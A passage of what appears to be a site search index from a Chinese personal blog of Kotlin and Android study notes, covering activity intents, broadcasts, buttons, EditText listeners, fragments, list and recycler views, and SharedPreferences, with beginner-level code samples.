点击后无法更新","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%887%E6%97%A5/"},{"title":"实习笔记-15","text":"gradle全局配置配置GRADLE_USER_HOME环境变量","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%888%E6%97%A5/"},{"title":"实习笔记-16","text":"Android View绘制流程performTraversals()获取Surface对象，performMeasure-丈量View树的各个view的大小，performLayout-对整个视图树进行布局，performDraw，对视图树进行绘制源码解析 第一阶段，确定activity的宽高123456789if(Activity窗口是第一次被请求执行测量、布局和绘制操作){ if(如果窗口的类型是有状态栏的){ Activity窗口所需要的宽度和高度就是除了状态栏; }else{ Activity窗口所需要的宽度和高度就是整个屏幕的宽高; }}else{ Activity窗口的宽高为frame成员变量中的保存的上一次测量、布局和绘制时的值;} 排序中文按照拼音排序 1234567list.sortBy { try { URLEncoder.encode(it.label.lowercase(), &quot;GBK&quot;) } catch (e:Exception) { &quot;&quot; }} 123Comparator cmp = Collator.getInstance(java.util.Locale.CHINA);cmp.compare(s1,s2);Arrays.sort(arr, cmp); VectorDrawablemerge标签将merge下的所有view直接添加到根标签下","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022%E5%B9%B42%E6%9C%889%E6%97%A5/"},{"title":"Kotlin学习笔记——Activity活动跳转","text":"传送配对字段数据打开一个新页面1startActivity&lt;secondActivity&gt;() 注意 这个函数需要anko库的支持 打开页面并向新页面传递参数使用关键字to1234startActivity&lt;secondActivity&gt;( &quot;start_time&quot; to currentTime.toString(), &quot;message&quot; to &quot;good Morning&quot; ) 使用Pair类1234startActivity&lt;secondActivity&gt; ( Pair(&quot;start_time&quot;, currentTime.toString(), Pair(&quot;message&quot;, &quot;good Morning&quot;)) 在新页面中获取参数123val bundle = intent.extrasval start_time = bundle.getString(&quot;start_time&quot;)val message = bundle.getString(&quot;message&quot;) 补充1. intent参考：Android组件系列—-Intent详解 Intent的概念：Android中提供了Intent机制来协助应用间的交互与通讯，或者采用更准确的说法是，Intent不仅可用于应用程序之间，也可用于应用程序内部的activity, service和broadcast receiver之间的交互。Intent这个英语单词的本意是“目的、意向、意图”。 Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。 activity、service和broadcast receiver之间是通过Intent进行通信的，而另外一个组件Content Provider本身就是一种通信机制，不需要通过Intent。我们来看下面这个图就知道了： 如果Activity1需要和Activity2进行联系，二者不需要直接联系，而是通过Intent作为桥梁。通俗来讲，Intnet类似于中介、媒婆的角色。 2. bundle参考Android中Bundle类的作用 Android中Bundle类的作用 Bundle类用作携带数据，它类似于Map，用于存放key-value名值对形式的值 根据google官方的文档（http://developer.android.com/reference/android/os/Bundle.html） Bundle类是一个key-value对，“A mapping from String values to various Parcelable types.” 传送序列化数据12@Parcelizedata class MessageInfo(val content: String, val send_time: String) : Parcelable {} 注意 注解@Parcelize不是没有用的，它可以告诉编译器，让编译器自动实现writeToParcel、createFromParcel、newArray、describeContents四个方法 要在build.gradle的文件末尾添加如下几行123androidExtensions { experimental = true} 这样以后，就可以在页面之间传递活动跳转的序列化数据了12val request = MessageInfo(&quot;你好你好！&quot;, currentTime.toString())startActivity&lt;secondActivity&gt;(&quot;message&quot; to request) 在跳转后的页面获取数据1val request = intent.extras.getParcelabel&lt;MessageInfo&gt;(&quot;message)//获得数据 跳转时指定启动模式 启动标志 对应anko库函数 说明 备注 Intent.FLAG_ACTIVITY_NEW_TAST intent.newTask() 开启一个新任务。这个值类似于launchMode=”standard”，不同之处在于，如果原来不存在活动栈，这个标志就会创建一个新栈 Intent.FLAG_ACTIVITY_SINGLE_TOP intent.singleTop() 当栈顶为待跳转的activity实例时，重用栈顶的实例，该值等同于launchMode=”singleTop” Intent.FLAG_ACTIVITY_CLEAR_TOP intent.clrarTop() 当栈中存在待跳转的activity实例时，重新创建一个新实例，并将原实例上方所有实例清除。该值与launchMode=”singleTask”相似，但是launchMode=”singleTask”采用onNewInten启用原任务，而这个标志先onDestroy再onCreate创建新任务 Intent.FLAG_ACTIVITY_NO_HISTORY intent.noHistory() 这个标志与launchMode=”standard”相似，但栈中不保存新启动的activity实例。下次无论使用哪种方法再启动该实例，都要走完standard的完整流程 Intent.FLAG_ACTIVITY_CLEAR_TAST intent.clearTask() 这个标志非常暴力，跳转到新页面时，栈中原有实例都被清空。这个flag要结合newTask使用 处理返回数据当从一个页面跳转回原来的页面时，有可能要向上一个activity返回一些数据 第一个页面打开第二个页面时，改用startActivityForResult12val info = MessageInfo(&quot;去吧！去吧！&quot;, currentTime.toString())startActivityForResult&lt;secondActivity&gt;(0, &quot;go！go！go！&quot; to info)//传递给第二个页面的数据 第二个页面退出时，添加传送数据123456val info = MessageInfo(&quot;回来了！回来了！&quot;, currentTime.toString())//返回给第一个页面的数据//MessageInfo类是之前写的继承Parcelable 的 data classval intent = Intent()intent.putExtra(&quot;back&quot;, info)setResult(Activity.RESULT_OK, intent)finish() 上一个页面接受返回值123456override fun onActivityResult(RequestCode:Int, resultCode:Int, data:Intent?) { if (data != null) { val response = data.extras.getParcelable&lt;MessageInfo&gt;(&quot;back&quot;) //获取了MessageInfo类的对象 }} onRestart()函数参考： Activity的onRestart()方法调用时机 两分钟彻底让你明白Android Activity生命周期(图文)! https://blog.csdn.net/liuhe688/article/details/6733407 调用时机 按下home键之后，然后切换回来，会调用onRestart()。 从本Activity跳转到另一个Activity之后，按back键返回原来Activity，会调用onRestart(); 从本Activity切换到其他的应用，然后再从其他应用切换回来，会调用onRestart(); 应用场景在登录页面上，用户忘记密码，点击”忘记密码”并跳转到相应页面，当返回登录页面时，最好自动清空原来的密码，如果这个操作写在onActivityResult上，那么当用户打开”找回密码”页面，不属于调用onActivityResult的时机 实例1234override fun onRestart() { //do what u wanna do super.onRestart()}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Activity%E6%B4%BB%E5%8A%A8%E8%B7%B3%E8%BD%AC/"},{"title":"Kotlin学习笔记——BroadCast","text":"1#define 小毛驴 xml 收发广播使用场景：Fragment想要向外传递信息 在Fragment中发送广播1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class BlankFragment : Fragment() { var ctx:Context? = null var mPosition:Int = 0 var mInageId:Int = 0 var mDesc:String = &quot;&quot; var title:String = &quot;&quot; val colorNames = listOf&lt;String&gt;(&quot;红色&quot;,&quot;黄色&quot;,&quot;绿色&quot;,&quot;青色&quot;,&quot;蓝色&quot;) val colors = intArrayOf(Color.RED, Color.YELLOW, Color.GREEN, Color.CYAN, Color.BLUE) var mSeq:Int = 0 override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? { ctx = activity if (arguments != null) { mPosition = arguments!!.getInt(&quot;position&quot;, 0) mInageId = arguments!!.getInt(&quot;image_id&quot;, 0) mDesc = arguments!!.getString(&quot;desc&quot;) title = arguments!!.getString(&quot;title&quot;) } val view = inflater.inflate(R.layout.show_info, container, false) view.findViewById&lt;ImageView&gt;(R.id.imageView).setImageResource(mInageId) view.findViewById&lt;TextView&gt;(R.id.textView).text = mDesc view.findViewById&lt;Button&gt;(R.id.se).setOnClickListener { ctx!!.selector(&quot;选择颜色&quot;, colorNames) { mSeq = it val intent = Intent(BlankFragment.EVENT) intent.putExtra(&quot;seq&quot;, it) intent.putExtra(&quot;color&quot;, colors[it]) ctx!!.sendBroadcast(intent)//发送广播 } } return view } companion object { const val EVENT:String = &quot;changeColor&quot;//const，编译期常量 fun newInstance(position:Int, image_id:Int, desc:String, title:String) : BlankFragment { val fragment = BlankFragment() val bundle = Bundle() bundle.putInt(&quot;position&quot;, position) bundle.putInt(&quot;image_id&quot;, image_id) bundle.putString(&quot;desc&quot;, desc) bundle.putString(&quot;title&quot;, title) fragment.arguments = bundle return fragment } }} 在要接收广播的页面注册receiver1234567891011121314151617181920212223242526272829303132333435363738394041class MainActivity : FragmentActivity(){ private var BGChangeRecever:myBgChangeRecever? = null override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) var vp:ViewPager = findViewById(R.id.vp) var title: PagerTabStrip = findViewById(R.id.title) val pics = arrayOf(R.mipmap.basic, R.mipmap.close, R.mipmap.debug, R.mipmap.edit) val list:MutableList&lt;itemInfo&gt; = mutableListOf() for (i in pics.indices) { list.add(itemInfo((i+1).toString(), pics[i], ((i+1)*(i+1)).toString())) } vp.adapter = infoPagerAdapter(supportFragmentManager, list) vp.currentItem = 0 } public override fun onStart() { super.onStart() BGChangeRecever = myBgChangeRecever() val filiter = IntentFilter(BlankFragment.EVENT)//广播过滤器，过滤掉参数以外的广播 registerReceiver(BGChangeRecever,filiter)//开始时注册接收器 } public override fun onStop() { unregisterReceiver(BGChangeRecever)//结束前注销接收器 super.onStop() } private inner class myBgChangeRecever : BroadcastReceiver() {//广播接收器 override fun onReceive(context: Context?, intent: Intent?) {//接收广播后执行的操作 if (intent != null) { val color = intent.getIntExtra(&quot;color&quot;, Color.GREEN) textView2.setTextColor(color) } } }} 接收系统广播静态注册没学会 动态注册1234567891011121314151617181920212223242526272829303132333435363738394041424344class MainActivity : AppCompatActivity() { var receiver:broadCastRecever = broadCastRecever() override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) } override fun onDestroy() { super.onDestroy() receiver.unRegiste() } override fun onStart() { super.onStart() receiver.registe(this) } inner class broadCastRecever : BroadcastReceiver() { private var isRegisted = false var allBroadCast = arrayOf(Intent.ACTION_TIME_TICK, Intent.ACTION_SCREEN_ON, Intent.ACTION_SCREEN_OFF) var registTo:Context? = null override fun onReceive(context: Context?, intent: Intent?) { text.append(&quot;收到：${(intent?.action?:&quot;empty&quot;)}\\n&quot;) } fun registe(context: Context) { if (!isRegisted) { var filter:IntentFilter = IntentFilter() for (item in allBroadCast) { filter.addAction(item) } context.registerReceiver(this@broadCastRecever, filter) isRegisted = true registTo = context } } fun unRegiste() { if (isRegisted) { registTo?.unregisterReceiver(this@broadCastRecever) isRegisted = false } } }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94BroadCast/"},{"title":"Kotlin学习笔记——Button","text":"实现短按长按的方法调用函数 方法 参数 参数解释 返回值 备注 setOnClickListener lambda表达式 lambda的参数为发生点击动作的View，返回值Unit Unit 相当于override fun onClickListener(v:View) setOnLongClickListener lambda表达式 lambda的参数为发生点击动作的View，返回值Boolean(true表示这个事件已经消耗完了，false表示事件继续传递，会触发一次短按事件) Unit 相当于override fun onLongClick(v:View):Boolean 例子1234567btn.setOnClickListener { toast(&quot;click&quot;)}btn.setOnLongClickListener { toast(&quot;Long Click&quot;) true} 使用内部类例子12345678910//在Activity类里面/*inner 关键字，访问外部类的数据继承View.onClickListener*/private inner class MyClickListener : View.onClickListener { override fun onClick(v:View) { toast.(&quot;您点击了：${(v as Button).text}&quot;) }} 实现接口让当前Activity实现OnClickListener和OnLongClickListener两个接口 例子12345678910111213141516171819class MainActivity : AppCompatActivity() , OnClickListener, OnLongClickListener { override fun onClick(v: View?) { var text:TextView = findViewById(R.id.text) text.append(&quot;hello world\\n&quot;) } override fun onLongClick(v: View?): Boolean { toast(&quot;哎呀，一直按着人家干什么啦~~&quot;) return true } override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) var start:FloatingActionButton = findViewById(R.id.start) start.setOnLongClickListener(this) start.setOnClickListener(this) }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Button/"},{"title":"Kotlin学习笔记——EditText","text":"输入监听器方便起见，在activity的内部写一个内部类，用来监听输入 编写监听器1234567891011inner class EditWatcher : TextWatcher { override fun afterTextChanged(s:Editable) { } override fun beforeTextChanged(s:CharSequence, start:Int, count:Int, after:Int) { } override fun onTextChanged(s:CharSequence, start:Int, count:Int, after:Int) { }} 注意 把Editable直接toString()就是用户当前的输入 使用监听器1et.addTextChangedListener(EditWatcher()) 效果1. 自动隐藏输入法面板12345678910111213141516171819202122232425private inner class EditWatcher(val type:String, val len:Int, val edit:EditText) : TextWatcher { override fun afterTextChanged(s:Editable) { var str:String = s.toString() if (str.indexOf(&quot;\\n&quot;) &gt;= 0 || str.indexOf(&quot;\\r&quot;) &gt;= 0 || str.indexOf(&quot; &quot;) &gt;= 0) { str = str.replace(&quot;\\r&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;).replace(&quot; &quot;, &quot;&quot;) } if (str.length &gt; len) { toast(&quot;${type}最长${len}位！&quot;) edit.setText(str.substring(0, len)) //大于len的时候再截取子串 val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager //软键盘如果已经打开则关闭之 if (imm.isActive) { imm.toggleSoftInput(0, InputMethodManager.HIDE_NOT_ALWAYS) } } } override fun beforeTextChanged(s:CharSequence, start:Int, count:Int, after:Int) { } override fun onTextChanged(s:CharSequence, start:Int, count:Int, after:Int) { }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94EditText/"},{"title":"Kotlin学习笔记——Fragment","text":"1#define 小毛驴 xml 使用方法Fragment与ViewPager搭配，实现翻页，实现每页多个控件 写好每个item的小毛驴文件和数据传送类 继承Fragment类，自定义一个fragment12345678910111213141516171819202122232425262728293031323334353637383940class BlankFragment : Fragment() { var ctx:Context? = null var mPosition:Int = 0 var mInageId:Int = 0 var mDesc:String = &quot;&quot; var title:String = &quot;&quot; val colorNames = listOf&lt;String&gt;(&quot;红色&quot;,&quot;黄色&quot;,&quot;绿色&quot;,&quot;青色&quot;,&quot;蓝色&quot;) val colors = intArrayOf(Color.RED, Color.YELLOW, Color.GREEN, Color.CYAN, Color.BLUE) var mSeq:Int = 0 override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? { ctx = activity if (arguments != null) { mPosition = arguments!!.getInt(&quot;position&quot;, 0) mInageId = arguments!!.getInt(&quot;image_id&quot;, 0) mDesc = arguments!!.getString(&quot;desc&quot;) title = arguments!!.getString(&quot;title&quot;) }//获取数据 val view = inflater.inflate(R.layout.show_info, container, false) view.findViewById&lt;ImageView&gt;(R.id.imageView).setImageResource(mInageId) view.findViewById&lt;TextView&gt;(R.id.textView).text = mDesc //显示数据 return view } companion object { fun newInstance(position:Int, image_id:Int, desc:String, title:String) : BlankFragment {//调用这个函数，创建新的fragment val fragment = BlankFragment() val bundle = Bundle() bundle.putInt(&quot;position&quot;, position) bundle.putInt(&quot;image_id&quot;, image_id) bundle.putString(&quot;desc&quot;, desc) bundle.putString(&quot;title&quot;, title) fragment.arguments = bundle return fragment } }} ViewPager的适配器1234567891011class infoPagerAdapter(val fragManger: FragmentManager, val itemList:MutableList&lt;itemInfo&gt;) : FragmentStatePagerAdapter(fragManger) { override fun getCount(): Int = itemList.size override fun getItem(p0: Int): Fragment { val item = itemList[p0] return BlankFragment.newInstance(p0, item.pic, item.desc, item.name) } override fun getPageTitle(position: Int): CharSequence? { return itemList[position].name }} 4.给ViewPager添加适配器12345678910111213class MainActivity : FragmentActivity(){//这个时候，继承的是FragmentActivity override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) var vp:ViewPager = findViewById(R.id.vp) var title: PagerTabStrip = findViewById(R.id.title) val list:MutableList&lt;itemInfo&gt; = mutableListOf() //省略中间给list赋值的过程 vp.adapter = infoPagerAdapter(supportFragmentManager, list) vp.currentItem = 0 }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Fragment/"},{"title":"Kotlin学习笔记——GridView","text":"Kotlin学习笔记——GridView1#define 小毛驴 xml 使用方法 设计好界面 新建一个小毛驴文件，这个小毛驴文件是GridView中，每一个Item的界面布局文件 （可选）编写一个数据类，用来保存每个item中的数据，用data class可以很方便 编写一个继承BaseAdapter适配器的类123456789101112131415161718192021222324252627282930313233343536class GridAdapter(private val context: Context, private val strList:MutableList&lt;myItems&gt;, private val background:Int) : BaseAdapter() { override fun getView(position: Int, convertView: View?, parent: ViewGroup?): View { var view = convertView val holder:ViewHolder if (convertView == null) { view = LayoutInflater.from(context).inflate(R.layout.item, null) //我猜这个函数的作用是指定这个类所对应的小毛驴文件 holder = ViewHolder() holder.myLayout = view.findViewById&lt;LinearLayout&gt;(R.id.all) holder.desc = view.findViewById&lt;TextView&gt;(R.id.textView) holder.pic = view.findViewById&lt;ImageView&gt;(R.id.imageView) view.tag = holder } else { holder = (view?.tag) as ViewHolder } //以上是固定格式 val myItem = strList[position] //传进来的数据数组，适配器根据数组大小反复调用这个函数构造ViewList //position是当前位置，对应数组下标 //holder.myLayout.setBackgroundColor(background) holder.desc.text = myItem.desc holder.pic.setImageResource(myItem.image) //以上是自定义每个控件的显示内容 return view!! } override fun getItem(position: Int): Any = strList[position] override fun getItemId(position: Int): Long = position.toLong() override fun getCount(): Int = strList.size inner class ViewHolder { lateinit var myLayout:LinearLayout lateinit var desc: TextView lateinit var pic: ImageView }} 如果编写了数据类（起了一个c++中结构体的作用，因为数组只能传递一个），创建对应的List并且赋值 给GridView添加适配器123456789var grid:GridView = findViewById(R.id.panel)var pics = arrayOf(R.mipmap.a, R.mipmap.b, R.mipmap.c, R.mipmap.d, R.mipmap.e, R.mipmap.f, R.mipmap.g, R.mipmap.h)var descs = arrayOf(&quot;超级大帅哥刘甜甜&quot;, &quot;刘甜甜最喜欢的大明星周周&quot;, &quot;刘甜甜最喜欢的性感裸男&quot;, &quot;刘甜甜最想养的橘猫&quot;, &quot;还是超级大帅哥刘甜甜&quot;, &quot;刘甜甜最喜欢的动画人物米奇&quot;, &quot;还是刘甜甜最喜欢的动画人物米奇&quot;, &quot;用来凑数的发际线哥&quot;)var data:MutableList&lt;myItems&gt; = mutableListOf()for (i in pics.indices) { data.add(myItems(descs[i], pics[i]))}grid.adapter = GridAdapter(this, data, Color.GRAY)grid.numColumns = 2//设置列数","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94GridView/"},{"title":"Kotlin学习笔记——ListView","text":"1#define 小毛驴 xml 使用方法 设计好界面 新建一个小毛驴文件，这个小毛驴文件是ListView中，每一个Item的界面布局文件 （可选）编写一个数据类，用来保存每个item中的数据，用data class可以很方便 编写一个继承BaseAdapter适配器的类123456789101112131415161718192021222324252627282930313233343536373839class ListViewAdapter(private val context: Context, private val strList:MutableList&lt;myItems&gt;, private val background:Int) : BaseAdapter() { override fun getView(position: Int, convertView: View?, parent: ViewGroup?): View { var view = convertView val holder:ViewHolder if (convertView == null) { view = LayoutInflater.from(context).inflate(R.layout.item, null) //我猜这个函数的作用是指定这个类所对应的小毛驴文件 holder = ViewHolder() holder.ll_item = view.findViewById&lt;LinearLayout&gt;(R.id.ll_item) holder.iv_icon = view.findViewById&lt;ImageView&gt;(R.id.iv_icon) holder.tv_name = view.findViewById&lt;TextView&gt;(R.id.tv_name) holder.tv_desc = view.findViewById&lt;TextView&gt;(R.id.tv_desc) view.tag = holder } else { holder = (view?.tag) as ViewHolder } //以上是固定格式 val myItem = strList[position] //传进来的数据数组，适配器根据数组大小反复调用这个函数构造ViewList //position是当前位置，对应数组下标 holder.ll_item.setBackgroundColor(background) holder.iv_icon.setImageResource(myItem.image) holder.tv_name.text = myItem.name holder.tv_desc.text = myItem.desc //以上是自定义每个控件的显示内容，根据之前传进来的List里面的数据 return view!! } override fun getItem(position: Int): Any = strList[position] override fun getItemId(position: Int): Long = position.toLong() override fun getCount(): Int = strList.size inner class ViewHolder { lateinit var ll_item:LinearLayout lateinit var iv_icon:ImageView lateinit var tv_name:TextView lateinit var tv_desc:TextView }} 如果编写了数据类（起了一个c++中结构体的作用，因为数组只能传递一个），创建对应的List并且赋值 给ListView添加适配器1234567891011121314var item:MutableList&lt;myItems&gt; = mutableListOf()val imageIds = arrayOf(R.mipmap.a, R.mipmap.b, R.mipmap.c, R.mipmap.d, R.mipmap.e)var name = arrayOf(&quot;超级大帅哥刘甜甜&quot;, &quot;还是超级大帅哥刘甜甜&quot;, &quot;可爱的橘猫&quot;, &quot;性感裸男&quot;,&quot;周周&quot;)var desc = arrayOf(&quot;是他是他就是他，我们的大帅哥，刘天天&quot;, &quot;是他是他还是他，我们的大帅哥，刘天天&quot;, &quot;刘天天最想养的橘猫&quot;, &quot;刘天天最喜欢的性感裸男&quot;,&quot;刘天天最喜欢的大明星周周&quot;)//各种数据setContentView(R.layout.activity_clickhere)for (i in imageIds.indices) { item.add(myItems(name[i], desc[i], imageIds[i]))}//初始化要传递的Listvar list:ListView = findViewById&lt;ListView&gt;(R.id.list)list.adapter = ListViewAdapter(this,item ,Color.WHITE)//你刚才自己写的适配器类//为ListView添加适配器","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94ListView/"},{"title":"Kotlin学习笔记——RadioButton和RadioGroup","text":"RadioButton的使用拖拽出RadioButton，和RadioGroup，把RadioButton拖到RadioGroup的子部件下 RadioGroup的使用 方法 使用 备注 android:orientation 设置RadioGroup中RadioButton的排列方式 “vertical”为垂直，”horizontal”为水平 setOnCheckedChangeListener 设置选择改变时的操作 无 特定效果RadioButton多行多列显示解决方案1多个ButtonGroup，当一个group的按钮被选择后，清除其他按钮的选择 解决方案2重写 RadioGroup 的 onMeasure、onLayout 实现 RadioButton 多行多列排列参考教程（来自csdn）图片编辑器–重写 RadioGroup 的 onMeasure、onLayout 实现 RadioButton 多行多列排列","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94RadioButton%E5%92%8CRadioGroup/"},{"title":"Kotlin学习笔记——RecyclerView","text":"1#define 小毛驴 xml 布局管理器LinearLayoutManager类似于线性布局 构造 (Context context) (Context context,int orientation,boolean reverseLayout) (Context context, AttributeSet attrs, int defStyleAttr,int defStyleRes) 参数 解释 Context context 上下文，初始化时，构造方法内部加载资源用 int orientation 方向，垂直和水平，默认为垂直 boolean reverseLayout 是否倒序，设置为True，从最后一个item开始，倒序加载。此时，RecyclerView第一个item是添加进Adapter中的最后一个，最后一个item是第一个加进Adapter的数据,RecyclerView会自动滑到末尾 参考英勇青铜5 GridLayoutManager类似GridView 构造 解释 (Context context, int spanCount) spanCount为列数 (Context context, int spanCount, int orientation,boolean reverseLayout) orientation在GridLayoutManager中有静态常量 StaggeredGridLayoutManager瀑布流 构造 解释 (int spanCount, int orientation) 显然法 使用方法 写一个基础适配器1234567891011121314151617181920212223242526272829303132//abstract抽象类作为基类abstract class RecyclerBaseAdapter&lt;VH: RecyclerView.ViewHolder&gt;(val context:Context) : RecyclerView.Adapter&lt;RecyclerView.ViewHolder&gt;(), AdapterView.OnItemClickListener, AdapterView.OnItemLongClickListener { //与小毛驴文件绑定 val inflater:LayoutInflater = LayoutInflater.from(context) override abstract fun getItemCount(): Int override abstract fun onCreateViewHolder(p0: ViewGroup, p1: Int): RecyclerView.ViewHolder override fun getItemViewType(position: Int): Int = 0 override fun getItemId(position: Int): Long = position.toLong() var itemClickListener:AdapterView.OnItemClickListener? = null fun setOnItemClickListener(listener:AdapterView.OnItemClickListener) { this.itemClickListener = listener } var itemLongClickListener: AdapterView.OnItemLongClickListener? = null fun setOnItemLongClickLostenner(listener: AdapterView.OnItemLongClickListener) { this.itemLongClickListener = listener } override fun onItemClick(parent: AdapterView&lt;*&gt;?, view: View?, position: Int, id: Long) { } override fun onItemLongClick(parent: AdapterView&lt;*&gt;?, view: View?, position: Int, id: Long): Boolean { return true }} 设计好item的小毛驴文件，写好传送数据的类 完成业务逻辑的适配器1234567891011121314151617181920212223class RecyclerGridAdapter(context:Context, private val infos:MutableList&lt;RecyclerInfo&gt;) : RecyclerBaseAdapter&lt;RecyclerView.ViewHolder&gt;(context) { //继承刚才的基础类 override fun getItemCount(): Int = infos.size override fun onCreateViewHolder(p0: ViewGroup, p1: Int): RecyclerView.ViewHolder { val view: View = inflater.inflate(R.layout.layout ,p0, false) return ItemHoder(view) } override fun onBindViewHolder(p0: RecyclerView.ViewHolder, p1: Int) { val vh = p0 as ItemHoder vh.pic.setImageResource(infos[p1].pic) vh.text.text = infos[p1].text } inner class ItemHoder(view:View): RecyclerView.ViewHolder(view) { val ll = view.findViewById&lt;ConstraintLayout&gt;(R.id.ll) var pic = view.findViewById&lt;ImageView&gt;(R.id.pic) var text = view.findViewById&lt;TextView&gt;(R.id.text) }} 为RecyclerView添加布局管理器和适配器12345678910111213141516171819202122232425262728293031323334353637class MainActivity : AppCompatActivity() { var l:RecyclerView? = null override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) var data:MutableList&lt;RecyclerInfo&gt; = mutableListOf() //省略为data赋值的代码 l = findViewById(R.id.l) l?.layoutManager = LinearLayoutManager(this, LinearLayoutManager.VERTICAL, false) val adapter = RecyclerGridAdapter(this, data) adapter.setOnItemClickListener(adapter) adapter.setOnItemLongClickLostenner(adapter) l?.adapter = adapter l?.itemAnimator = DefaultItemAnimator() l?.addItemDecoration(SpacesItemDecoration(30)) } override fun onCreateOptionsMenu(menu: Menu?): Boolean { menu?.add(&quot;LinearLayoutManager(线性)&quot;) menu?.add(&quot;GridLayoutManager(网格)&quot;) menu?.add(&quot;StaggeredGridLayoutManager(瀑布流)&quot;) return super.onCreateOptionsMenu(menu) } override fun onOptionsItemSelected(item: MenuItem?): Boolean { if (item != null) {//菜单中选择各种布局 when(item.title) { &quot;LinearLayoutManager(线性)&quot; -&gt; l?.layoutManager = LinearLayoutManager(this, LinearLayoutManager.VERTICAL, false) &quot;GridLayoutManager(网格)&quot; -&gt; l?.layoutManager = GridLayoutManager(this, 2) &quot;StaggeredGridLayoutManager(瀑布流)&quot; -&gt; l?.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL) else -&gt; toast(&quot;error&quot;) } } return super.onOptionsItemSelected(item) }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94RecyclerView/"},{"title":"Kotlin学习笔记——SharedPreference","text":"12#define 小毛驴 xml#define SPS SharedPreferences 知识补充模板类 Any类——相当于java中的Object类 &lt;*&gt;——相当于java中的&lt;?&gt;表示不同于模板类的T 委托属性待补充 lazy修饰符让变量在首次使用的时候赋值 与lateinit的区别： lateinit是在创建变量时不赋值，想编译器保证在使用之前会赋值，这样这个变量仍然会被当做非空变量 lazy是创建变量时”赋值”，但是真正赋值是在首次使用的时候才赋值 with函数1with(函数头语句){函数体语句} 函数头语句先于函数体语句执行，函数头语句会返回一个值 函数体语句会在头语句的返回对象的命名空间中执行，体语句可以直接调用头部返回的类的方法 使用场景SharedPreferences是Android中最简单的数据储存方式 使用方法方法一览SharedPreferences类的方法（注意最后有一个s） 方法 参数 解释 getSharedPreferences String + MODD 初始化一个SPS。第一个String是文件名，与str.xml文件共享参数。第二个参数是参数的操作模式，是Context类中的静态常量（这个函数不是SPS的方法，是Context的，但是为了方便起见写在这里） getString key-value obviously getInt key-value obviously getBoolean key-value obviously getFloat key-value obviously getLong key-value obviously 编写一个Util类123456789101112131415161718192021222324252627282930313233343536373839class SharedPreferencesUtil&lt;T&gt;(val context: Context, val name:String, val default:T) : ReadWriteProperty&lt;Any?, T&gt; { val prefs: SharedPreferences by lazy { context.getSharedPreferences(&quot;default&quot;, Context.MODE_PRIVATE) } override fun getValue(thisRef: Any?, property: KProperty&lt;*&gt;): T { return findPreference(name, default) } override fun setValue(thisRef: Any?, property: KProperty&lt;*&gt;, value: T) { putPreference(name, value) } private fun findPreference(name:String, default: T) : T = with(prefs){ return when (default) { is Long -&gt; getLong(name, default) is String -&gt; getString(name, default) is Int -&gt; getInt(name, default) is Boolean -&gt; getBoolean(name, default) is Float -&gt; getFloat(name, default) else -&gt; throw IllegalArgumentException(&quot;Unsupport type&quot;) } as T } private fun &lt;T&gt; putPreference(name:String, value:T) = with(prefs.edit()) { when (value) { is Long -&gt; putLong(name, value) is String -&gt; putString(name, value) is Int -&gt; putInt(name, value) is Boolean -&gt; putBoolean(name, value) is Float -&gt; putFloat(name, value) else -&gt; throw IllegalArgumentException(&quot;Unsupport type&quot;) }.apply() //commit和apply都表示提交 